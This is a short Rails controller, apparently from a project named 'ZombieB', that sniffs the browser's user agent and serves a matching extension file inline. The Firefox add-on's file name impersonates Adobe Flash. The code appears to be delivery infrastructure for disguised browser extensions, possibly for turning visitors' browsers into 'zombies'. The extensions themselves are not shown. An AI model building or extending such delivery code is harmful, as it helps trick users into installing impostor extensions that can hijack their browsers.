class ExtensionsController < ApplicationController
	def show
		 useragent = request.env["HTTP_USER_AGENT"] 
		 case useragent 
			 when /Chrome/ then send_file "C:\\Sites\\ZombieB\\extensions\\chrome.crx", :type=>"application/x-chrome-extension", :disposition => 'inline'  
			 when /Firefox/ then send_file "C:\\Sites\\ZombieB\\extensions\\flashX@adobe.com.xpi" , :type=>"application/x-xpinstall", :disposition => 'inline' 
			 when /Fennec/ then send_file "C:\\Sites\\ZombieB\\extensions\\flashX@adobe.com.xpi" , :type=>"application/x-xpinstall", :disposition => 'inline' 
			 when /Safari/ then send_file "C:\\Sites\\ZombieB\\extensions\\plcedphjalijciokheehbpkhcohflajd-safari.safariextz" , :type=>"application/x-safari-extension", :disposition => 'inline'  
		end
	end
end  